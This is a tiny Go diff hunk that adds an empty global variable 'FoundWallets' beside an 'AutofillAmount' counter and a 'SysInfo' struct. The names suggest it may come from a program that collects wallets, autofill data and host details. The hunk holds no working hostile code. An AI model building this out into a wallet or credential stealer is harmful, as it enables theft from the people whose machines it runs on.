@@ -18,6 +18,8 @@ var (
 	AutofillAmount = 0
 )
 
+var FoundWallets = ""
+
 type SysInfo struct {
 	Hostname string
 	Platform string
